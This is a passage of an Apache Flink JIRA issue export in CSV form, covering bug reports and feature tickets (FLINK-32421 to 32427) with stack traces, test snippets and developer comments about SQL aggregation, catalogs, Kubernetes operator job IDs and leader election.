<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hackergin,hackergin,hackergin,25/Jun/23 16:30,20/Jul/23 10:13,04/Jun/24 20:41,20/Jul/23 10:13,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 20 10:13:13 UTC 2023,,,,,,,,,,"0|z1irmg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 16:46;hackergin;[~Leonard] I would like to take this, please assign this task to me . ;;;","20/Jul/23 10:13;leonard;Fixed in master: 288a4982c3473fcc08be52a6641d77c4ed2cdb5b;;;",,,,,,,,,,,,,,,,,,,,,
FLIP-295: Support lazy initialization of catalogs and persistence of catalog configurations,FLINK-32427,13541314,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,hackergin,hackergin,hackergin,25/Jun/23 16:29,11/Mar/24 12:44,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Table SQL / API,,,,0,,,,Umbrella issue for https://cwiki.apache.org/confluence/display/FLINK/FLIP-295%3A+Support+lazy+initialization+of+catalogs+and+persistence+of+catalog+configurations,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 25 11:54:54 UTC 2023,,,,,,,,,,"0|z1irm8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 13:45;ferenc-csaky;Hi [~hackergin],

Really happy to see this feature coming in 1.18, we are also looking forward to use SQL gateway in our product and this taks removes one of the blockers, so if I can help out with any of the tickets to move things forward, pls. reach out.;;;","04/Jul/23 07:19;hackergin;[~ferenc-csaky] Thank you for your interest in this feature. Currently, you can help review the relevant code. Once task1 and task2 are completed, We can develop and implement the following task in parallel.;;;","25/Jul/23 11:47;knaufk;What is the status of this feature in Flink 1.18? Is it usable or partially usable? If yes, is there documentation yet?;;;","25/Jul/23 11:54;hackergin;[~knaufk] It is usable. And the unfinished tasks are some optimization items that do not affect the overall functionality. I will add documentation as soon as possible.;;;",,,,,,,,,,,,,,,,,,,
Fix adaptive local hash agg can't work when auxGrouping exist,FLINK-32426,13541296,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,lsy,lsy,lsy,25/Jun/23 09:59,01/Nov/23 11:31,04/Jun/24 20:41,29/Jun/23 12:27,1.17.1,1.18.0,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,"For the following case, the field `a` is primary key,  we select from `AuxGroupingTable` and group by a, b. Since a is primary key, it also guarantee the unique, so planner will extract b as auxGrouping field.
{code:java}
registerCollection(
  ""AuxGroupingTable"",
  data2,
  type2,
  ""a, b, c, d, e"",
  nullablesOfData2,
  FlinkStatistic.builder().uniqueKeys(Set(Set(""a"").asJava).asJava).build())

checkResult(
  ""SELECT a, b, COUNT(c) FROM AuxGroupingTable GROUP BY a, b"",
  Seq(
    row(1, 1, 1),
    row(2, 3, 2),
    row(3, 4, 3),
    row(4, 10, 4),
    row(5, 11, 5)
  )
) {code}
 

Due to the generated code doesn't get auxGrouping fields from input RowData and then setting it to aggBuffer, the aggBuffer RowData loses some fields, and it will throw an index Exception when get the field from it. As following:
{code:java}
Caused by: java.lang.AssertionError: index (1) should < 1
    at org.apache.flink.table.data.binary.BinaryRowData.assertIndexIsValid(BinaryRowData.java:127)
    at org.apache.flink.table.data.binary.BinaryRowData.isNullAt(BinaryRowData.java:156)
    at org.apache.flink.table.data.utils.JoinedRowData.isNullAt(JoinedRowData.java:113)
    at org.apache.flink.table.runtime.typeutils.RowDataSerializer.toBinaryRow(RowDataSerializer.java:201)
    at org.apache.flink.table.runtime.typeutils.RowDataSerializer.serialize(RowDataSerializer.java:103)
    at org.apache.flink.table.runtime.typeutils.RowDataSerializer.serialize(RowDataSerializer.java:48)
    at org.apache.flink.streaming.runtime.streamrecord.StreamElementSerializer.serialize(StreamElementSerializer.java:165)
    at org.apache.flink.streaming.runtime.streamrecord.StreamElementSerializer.serialize(StreamElementSerializer.java:43)
    at org.apache.flink.runtime.plugable.SerializationDelegate.write(SerializationDelegate.java:54)
    at org.apache.flink.runtime.io.network.api.writer.RecordWriter.serializeRecord(RecordWriter.java:141)
    at org.apache.flink.runtime.io.network.api.writer.RecordWriter.emit(RecordWriter.java:107)
    at org.apache.flink.runtime.io.network.api.writer.ChannelSelectorRecordWriter.emit(ChannelSelectorRecordWriter.java:55)
    at org.apache.flink.streaming.runtime.io.RecordWriterOutput.pushToRecordWriter(RecordWriterOutput.java:134)
    at org.apache.flink.streaming.runtime.io.RecordWriterOutput.collectAndCheckIfChained(RecordWriterOutput.java:114)
    at org.apache.flink.streaming.runtime.io.RecordWriterOutput.collect(RecordWriterOutput.java:95)
    at org.apache.flink.streaming.runtime.io.RecordWriterOutput.collect(RecordWriterOutput.java:48)
    at org.apache.flink.streaming.api.operators.CountingOutput.collect(CountingOutput.java:59)
    at org.apache.flink.streaming.api.operators.CountingOutput.collect(CountingOutput.java:31)
    at LocalHashAggregateWithKeys$39.processElement_split2(Unknown Source)
    at LocalHashAggregateWithKeys$39.processElement(Unknown Source)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.pushToOperator(ChainingOutput.java:108)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:77)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:39)
    at BatchExecCalc$10.processElement(Unknown Source)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.pushToOperator(ChainingOutput.java:108)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:77)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:39)
    at SourceConversion$6.processElement(Unknown Source)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.pushToOperator(ChainingOutput.java:108)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:77)
    at org.apache.flink.streaming.runtime.tasks.ChainingOutput.collect(ChainingOutput.java:39)
    at org.apache.flink.streaming.api.operators.StreamSourceContexts$ManualWatermarkContext.processAndCollect(StreamSourceContexts.java:418)
    at org.apache.flink.streaming.api.operators.StreamSourceContexts$WatermarkContext.collect(StreamSourceContexts.java:513)
    at org.apache.flink.streaming.api.operators.StreamSourceContexts$SwitchingOnClose.collect(StreamSourceContexts.java:103)
    at org.apache.flink.streaming.api.functions.source.InputFormatSourceFunction.run(InputFormatSourceFunction.java:92)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:110)
    at org.apache.flink.streaming.api.operators.StreamSource.run(StreamSource.java:67)
    at org.apache.flink.streaming.runtime.tasks.SourceStreamTask$LegacySourceFunctionThread.run(SourceStreamTask.java:333) {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Nov 01 11:31:43 UTC 2023,,,,,,,,,,"0|z1iri8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 02:07;jark;Could you add more description about what error will be thrown in which case? That would be helpful for SEO for users searching similar problems. ;;;","29/Jun/23 12:27;jark;Fixed in master: 3f485162a372818c1402d78bf9fb25e06ca1cdf7;;;","29/Jun/23 12:27;jark;[~lsy], do we need to fix it in 1.17.2 as well? If yes, could you help to create a PR for release-1.17 branch? ;;;","01/Nov/23 11:31;lsy;Fixed in 1.17: a461e949cb3068b5609b0c8921647e0cbf5e5e9e;;;",,,,,,,,,,,,,,,,,,,
Fix Opensearch Connector wrong empty doc link,FLINK-32425,13541294,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,tanyuxin,tanyuxin,tanyuxin,25/Jun/23 09:21,03/Nov/23 09:07,04/Jun/24 20:41,26/Jun/23 01:56,,,,,,,,,,,,,,,opensearch-1.1.0,,,,,,Connectors / Opensearch,,,,0,pull-request-available,,,"There is an empty link(""see here for further information"") in https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/datastream/opensearch/. And we should fix this.

The link should be like this (""See how to link with it for cluster execution here."") in https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/table/opensearch/
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 09:21:26 UTC 2023,,,,,,,,,,"0|z1irhs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 09:21;Weijie Guo;merged to main: 502274a308bedd1735d496099927031411482ad9.;;;",,,,,,,,,,,,,,,,,,,,,,
Flink ML CI fails due to NPE,FLINK-32424,13541284,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Jiang Xin,Jiang Xin,25/Jun/23 07:45,13/Jul/23 06:37,04/Jun/24 20:41,,,,,,,,,,,,,,,,ml-2.4.0,,,,,,Library / Machine Learning,,,,0,,,,"build link: https://github.com/apache/flink-ml/actions/runs/5368445516/jobs/9739341715?pr=244

The full stack is as below.
{code:java}
E                   py4j.protocol.Py4JJavaError: An error occurred while calling o64144.fit.
99E                   : java.lang.NullPointerException: metadataHandlerProvider
100E                   	at java.util.Objects.requireNonNull(Objects.java:228)
101E                   	at org.apache.calcite.rel.metadata.RelMetadataQueryBase.getMetadataHandlerProvider(RelMetadataQueryBase.java:122)
102E                   	at org.apache.calcite.rel.metadata.RelMetadataQueryBase.revise(RelMetadataQueryBase.java:118)
103E                   	at org.apache.calcite.rel.metadata.RelMetadataQuery.getPulledUpPredicates(RelMetadataQuery.java:844)
104E                   	at org.apache.calcite.rel.rules.ReduceExpressionsRule$ProjectReduceExpressionsRule.onMatch(ReduceExpressionsRule.java:307)
105E                   	at org.apache.calcite.plan.AbstractRelOptPlanner.fireRule(AbstractRelOptPlanner.java:337)
106E                   	at org.apache.calcite.plan.hep.HepPlanner.applyRule(HepPlanner.java:565)
107E                   	at org.apache.calcite.plan.hep.HepPlanner.applyRules(HepPlanner.java:428)
108E                   	at org.apache.calcite.plan.hep.HepPlanner.executeInstruction(HepPlanner.java:251)
109E                   	at org.apache.calcite.plan.hep.HepInstruction$RuleInstance.execute(HepInstruction.java:130)
110E                   	at org.apache.calcite.plan.hep.HepPlanner.executeProgram(HepPlanner.java:208)
111E                   	at org.apache.calcite.plan.hep.HepPlanner.findBestExp(HepPlanner.java:195)
112E                   	at org.apache.flink.table.planner.plan.optimize.program.FlinkHepProgram.optimize(FlinkHepProgram.scala:64)
113E                   	at org.apache.flink.table.planner.plan.optimize.program.FlinkHepRuleSetProgram.optimize(FlinkHepRuleSetProgram.scala:78)
114E                   	at org.apache.flink.table.planner.plan.optimize.program.FlinkChainedProgram.$anonfun$optimize$1(FlinkChainedProgram.scala:59)
115E                   	at scala.collection.TraversableOnce.$anonfun$foldLeft$1(TraversableOnce.scala:156)
116E                   	at scala.collection.TraversableOnce.$anonfun$foldLeft$1$adapted(TraversableOnce.scala:156)
117E                   	at scala.collection.Iterator.foreach(Iterator.scala:937)
118E                   	at scala.collection.Iterator.foreach$(Iterator.scala:937)
119E                   	at scala.collection.AbstractIterator.foreach(Iterator.scala:1425)
120E                   	at scala.collection.IterableLike.foreach(IterableLike.scala:70)
121E                   	at scala.collection.IterableLike.foreach$(IterableLike.scala:69)
122E                   	at scala.collection.AbstractIterable.foreach(Iterable.scala:54)
123E                   	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:156)
124E                   	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:154)
125E                   	at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104)
126E                   	at org.apache.flink.table.planner.plan.optimize.program.FlinkChainedProgram.optimize(FlinkChainedProgram.scala:55)
127E                   	at org.apache.flink.table.planner.plan.optimize.StreamCommonSubGraphBasedOptimizer.optimizeTree(StreamCommonSubGraphBasedOptimizer.scala:176)
128E                   	at org.apache.flink.table.planner.plan.optimize.StreamCommonSubGraphBasedOptimizer.doOptimize(StreamCommonSubGraphBasedOptimizer.scala:83)
129E                   	at org.apache.flink.table.planner.plan.optimize.CommonSubGraphBasedOptimizer.optimize(CommonSubGraphBasedOptimizer.scala:87)
130E                   	at org.apache.flink.table.planner.delegation.PlannerBase.optimize(PlannerBase.scala:329)
131E                   	at org.apache.flink.table.planner.delegation.PlannerBase.translate(PlannerBase.scala:195)
132E                   	at org.apache.flink.table.api.bridge.internal.AbstractStreamTableEnvironmentImpl.toStreamInternal(AbstractStreamTableEnvironmentImpl.java:224)
133E                   	at org.apache.flink.table.api.bridge.internal.AbstractStreamTableEnvironmentImpl.toStreamInternal(AbstractStreamTableEnvironmentImpl.java:219)
134E                   	at org.apache.flink.table.api.bridge.java.internal.StreamTableEnvironmentImpl.toDataStream(StreamTableEnvironmentImpl.java:253)
135E                   	at org.apache.flink.table.api.bridge.java.internal.StreamTableEnvironmentImpl.toDataStream(StreamTableEnvironmentImpl.java:226)
136E                   	at org.apache.flink.ml.feature.robustscaler.RobustScaler.fit(RobustScaler.java:77)
137E                   	at org.apache.flink.ml.feature.robustscaler.RobustScaler.fit(RobustScaler.java:62)
138E                   	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
139E                   	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
140E                   	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
141E                   	at java.lang.reflect.Method.invoke(Method.java:498)
142E                   	at org.apache.flink.api.python.shaded.py4j.reflection.MethodInvoker.invoke(MethodInvoker.java:244)
143E                   	at org.apache.flink.api.python.shaded.py4j.reflection.ReflectionEngine.invoke(ReflectionEngine.java:374)
144E                   	at org.apache.flink.api.python.shaded.py4j.Gateway.invoke(Gateway.java:282)
145E                   	at org.apache.flink.api.python.shaded.py4j.commands.AbstractCommand.invokeMethod(AbstractCommand.java:132)
146E                   	at org.apache.flink.api.python.shaded.py4j.commands.CallCommand.execute(CallCommand.java:79)
147E                   	at org.apache.flink.api.python.shaded.py4j.GatewayConnection.run(GatewayConnection.java:238)
148E                   	at java.lang.Thread.run(Thread.java:750) {code}",,,,,,,,,,,,,,,,,,,,FLINK-24241,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-25 07:45:49.0,,,,,,,,,,"0|z1irfk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Flink-sql-runner-example application fails if multiple execute() called in one sql file,FLINK-32423,13541276,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Not a Priority,Won't Fix,,yangguozhen,yangguozhen,25/Jun/23 03:05,01/Sep/23 06:34,04/Jun/24 20:41,31/Aug/23 06:30,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"h2. Summary:

flink-sql-runner-example application fails if multiple execute() called in one sql file
h2. Background:

We have a series of batch jobs running on a table partitioned by date. The jobs need to be run sequencially in chronological order. Which means only after the batch job #1 finishes running 2023-06-01 partition, the batch job #2 running 2023-06-02 partition starts running. So we loop through dates and submit multiple jobs in a single application, and the flink application is deployed in application mode with HA turned off.

According to [flink document|https://nightlies.apache.org/flink/flink-docs-release-1.16/docs/deployment/overview/#application-mode], the Application Mode allows the submission of applications consisting of multiple jobs, but High-Availability is not supported in these cases.
h2. The problem:

The application consisted of multiple jobs fails when the second job is executed.

Stack trace is shown as below:
{noformat}
2023-06-21 03:21:44,720 ERROR org.apache.flink.runtime.entrypoint.ClusterEntrypoint [] - Fatal error occurred in the cluster entrypoint.
java.util.concurrent.CompletionException: org.apache.flink.client.deployment.application.ApplicationExecutionException: Could not execute application.
    at java.util.concurrent.CompletableFuture.encodeThrowable(Unknown Source) ~[?:?]
    at java.util.concurrent.CompletableFuture.completeThrowable(Unknown Source) ~[?:?]
    at java.util.concurrent.CompletableFuture$UniCompose.tryFire(Unknown Source) ~[?:?]
    at java.util.concurrent.CompletableFuture.postComplete(Unknown Source) ~[?:?]
    at java.util.concurrent.CompletableFuture.completeExceptionally(Unknown Source) ~[?:?]
    at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.runApplicationEntryPoint(ApplicationDispatcherBootstrap.java:337) ~[flink-dist-1.1
    6.2.jar:1.16.2]
    at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.lambda$runApplicationAsync$2(ApplicationDispatcherBootstrap.java:254) ~[flink-dist
    -1.16.2.jar:1.16.2]
    at java.util.concurrent.Executors$RunnableAdapter.call(Unknown Source) ~[?:?]
    at java.util.concurrent.FutureTask.run(Unknown Source) ~[?:?]
    at org.apache.flink.runtime.concurrent.akka.ActorSystemScheduledExecutorAdapter$ScheduledFutureTask.run(ActorSystemScheduledExecutorAdapter.java:171) ~[flink-rpc-a
    kka_0e3d2618-241c-420f-a71d-2f4d1edcb5a1.jar:1.16.2]
    at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.runWithContextClassLoader(ClassLoadingUtils.java:68) ~[flink-rpc-akka_0e3d2618-241c-420f-a71d-2f4d1ed
    cb5a1.jar:1.16.2]
    at org.apache.flink.runtime.concurrent.akka.ClassLoadingUtils.lambda$withContextClassLoader$0(ClassLoadingUtils.java:41) ~[flink-rpc-akka_0e3d2618-241c-420f-a71d-2
    f4d1edcb5a1.jar:1.16.2]
    at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:49) [flink-rpc-akka_0e3d2618-241c-420f-a71d-2f4d1edcb5a1.jar:1.16.2]
    at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:48) [flink-rpc-akka_0e3d2618-241c-420f-a71d-2f4d1edcb5a1.jar
    :1.16.2]
    at java.util.concurrent.ForkJoinTask.doExec(Unknown Source) [?:?]
    at java.util.concurrent.ForkJoinPool$WorkQueue.topLevelExec(Unknown Source) [?:?]
    at java.util.concurrent.ForkJoinPool.scan(Unknown Source) [?:?]
    at java.util.concurrent.ForkJoinPool.runWorker(Unknown Source) [?:?]
    at java.util.concurrent.ForkJoinWorkerThread.run(Unknown Source) [?:?]
Caused by: org.apache.flink.client.deployment.application.ApplicationExecutionException: Could not execute application.
    ... 14 more
Caused by: org.apache.flink.client.program.ProgramInvocationException: The main method caused an error: Failed to execute sql
    at org.apache.flink.client.program.PackagedProgram.callMainMethod(PackagedProgram.java:372) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.program.PackagedProgram.invokeInteractiveModeForExecution(PackagedProgram.java:222) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.ClientUtils.executeProgram(ClientUtils.java:98) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.runApplicationEntryPoint(ApplicationDispatcherBootstrap.java:301) ~[flink-dist-1.1
    6.2.jar:1.16.2]
    ... 13 more
Caused by: org.apache.flink.table.api.TableException: Failed to execute sql
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeQueryOperation(TableEnvironmentImpl.java:903) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeInternal(TableEnvironmentImpl.java:1382) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeSql(TableEnvironmentImpl.java:730) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.examples.SqlRunner.main(SqlRunner.java:52) ~[?:?]
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:?]
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:?]
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:?]
    at java.lang.reflect.Method.invoke(Unknown Source) ~[?:?]
    at org.apache.flink.client.program.PackagedProgram.callMainMethod(PackagedProgram.java:355) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.program.PackagedProgram.invokeInteractiveModeForExecution(PackagedProgram.java:222) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.ClientUtils.executeProgram(ClientUtils.java:98) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.runApplicationEntryPoint(ApplicationDispatcherBootstrap.java:301) ~[flink-dist-1.1
    6.2.jar:1.16.2]
    ... 13 more
Caused by: org.apache.flink.util.FlinkRuntimeException: Cannot have more than one execute() or executeAsync() call in a single environment.
    at org.apache.flink.client.program.StreamContextEnvironment.validateAllowedExecution(StreamContextEnvironment.java:217) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.program.StreamContextEnvironment.executeAsync(StreamContextEnvironment.java:205) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.table.planner.delegation.DefaultExecutor.executeAsync(DefaultExecutor.java:95) ~[?:?]
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeQueryOperation(TableEnvironmentImpl.java:884) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeInternal(TableEnvironmentImpl.java:1382) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeSql(TableEnvironmentImpl.java:730) ~[flink-table-api-java-uber-1.16.2.jar:1.16.2]
    at org.apache.flink.examples.SqlRunner.main(SqlRunner.java:52) ~[?:?]
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:?]
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:?]
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:?]
    at java.lang.reflect.Method.invoke(Unknown Source) ~[?:?]
    at org.apache.flink.client.program.PackagedProgram.callMainMethod(PackagedProgram.java:355) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.program.PackagedProgram.invokeInteractiveModeForExecution(PackagedProgram.java:222) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.ClientUtils.executeProgram(ClientUtils.java:98) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.client.deployment.application.ApplicationDispatcherBootstrap.runApplicationEntryPoint(ApplicationDispatcherBootstrap.java:301) ~[flink-dist-1.1
    6.2.jar:1.16.2]
    ... 13 more
{noformat}
h2. How to reproduce:

1. Start a minikube cluster
2. Add new script file _two-selects.sql_ to [examples/flink-sql-runner-example/sql-scripts folder|https://github.com/apache/flink-kubernetes-operator/tree/main/examples/flink-sql-runner-example]. 
The contents of _two-selects.sql_ is shown as below.
{noformat}
select 1;
select 1;
{noformat}
3. Follow the [instruction|https://github.com/apache/flink-kubernetes-operator/blob/main/examples/flink-sql-runner-example/README.md] to build the flink-sql-runner-example image.
4. Use minikube image load command to load the image.
4. Modify [flinkdep yaml file|https://github.com/apache/flink-kubernetes-operator/blob/main/examples/flink-sql-runner-example/sql-example.yaml], change sepc.job.args to args: [""/opt/flink/usrlib/sql-scripts/two-selects.sql""]. Then apply the flinkdep yaml file.
5. The application fails.
h2. Possible reason:

According to [flink-kubernetes-oeprator document|https://nightlies.apache.org/flink/flink-kubernetes-operator-docs-main/docs/concepts/controller-flow/#application-reconciler], flink by default generate deterministic jobids based on clusterId.
{quote}Flink by default generates deterministic jobids based on the clusterId (which is the CR name in our case). This causes checkpoint path conflicts if the job is ever restarted from an empty state (stateless upgrade). We therefore generate a random jobid to avoid this.
{quote}
I found flink-kubernetes-operator always set job id when submitting application. [Corresponding code of setJobIdIfNecessary is here.|https://github.com/apache/flink-kubernetes-operator/blob/main/flink-kubernetes-operator/src/main/java/org/apache/flink/kubernetes/operator/reconciler/deployment/ApplicationReconciler.java#L191C18-L191C37]

But according to [flink's code|https://github.com/apache/flink/blob/master/flink-clients/src/main/java/org/apache/flink/client/deployment/application/ApplicationDispatcherBootstrap.java#L213], there are two situations.

1. HA is not activated and job id is not set when submitting application(line 213 to 217). runApplicationAsync is called with enforceSingleJobExecution=false. So mult-job execution is viable.
2. If job id is not set when submitting application(line 218 to 233). Job id is set based on cluster id. After the job is fixed, runApplicationAsync is called with enforceSingleJobExecution=true. So multi-job execution is not viable.

If flink-kubernetes-operator always set job id when submitting application, condition of situation #1 will never match. So application submitted with flink-kubernetes-operator cannot execute multiple jobs, even if the application is deployed in application mode and with HA turned off.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Sep 01 06:34:35 UTC 2023,,,,,,,,,,"0|z1irds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"31/Aug/23 06:30;gyfora;The SQL runner is intended to be an example and not really a proper all encompassing solution :) I think this limitation is acceptable;;;","01/Sep/23 03:46;yangguozhen;[~gyfora] The flow is not introduced by the flink-sql-runner-example application actually. It's a flaw introduced by flink kubernetes operator.

The setJobIdIfNecessary function call in flink kubernetes operator's code assigned job id, no matter whether the flink application is submitted with HA on or off.

So when the flink application consisted of multiple jobs is submitted with HA off, which is allowed according to flink's document, the flink kubernetes operator assigns a fixed job id to the first job. Flink cluster will prohibit next job running in the same application when the first job is submmitted with fixed job id, which conflictes with flink's document.

I think is not a minor issue with the flink-sql-runner-example. It's actually a flaw of flink kubernetes operator.;;;","01/Sep/23 06:34;gyfora;The operator by design doesn’t support managing multiple jobs in a single resource at the moment So this is not a bug/flaw but the current design;;;",,,,,,,,,,,,,,,,,,,,
EmbeddedLeaderService doesn't handle the leader events properly in edge cases,FLINK-32422,13541200,13542119,Sub-task,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,mapohl,mapohl,mapohl,23/Jun/23 16:18,10/Aug/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,,,,0,pull-request-available,stale-assigned,,"The leadership is granted when registering the first contender. This sets the leadership flag within the EmbeddedLeaderService (see [EmbeddedLeaderService:312ff|https://github.com/apache/flink/blob/033aca7566a0a561410b3c0e1ae8dca856cd26ce/flink-runtime/src/main/java/org/apache/flink/runtime/highavailability/nonha/embedded/EmbeddedLeaderService.java#L312]: the grantLeadershipCall is triggered afterwards informing the contender about its leadership). In the meantime, close can be called on the contender which deregisters the contender again calling revoke on the contender without having been able to gain the leadership.

This issue was introduced by FLINK-30765.",,,,,,,,,,,,,,,,,,,,,FLINK-30765,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 22:35:08 UTC 2023,,,,,,,,,,"0|z1iqx4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"28/Jun/23 13:05;mapohl;I thought about it once more: The revoke leadership event should be immediately handled by the {{LeaderElectionService}} because it means that the contender is deregistered and wouldn't be able to handle any outstanding leadership events anymore, anyway. In this way, we have to accept that a revoke event can be sent to the contender twice.

It's implemented in the same way in the {{DefaultLeaderElectionService}} (see [DefaultLeaderElectionService:233|https://github.com/apache/flink/blob/caa5f181598658403d081a0d8b733330c70ec51c/flink-runtime/src/main/java/org/apache/flink/runtime/leaderelection/DefaultLeaderElectionService.java#L233]).

I'm downgrading this issue to Minor. I will add a test case in {{EmbeddedLeaderServiceTest}}.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,,
EmbeddedLeaderServiceTest.testConcurrentRevokeLeadershipAndShutdown is not properly implemented,FLINK-32421,13541194,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
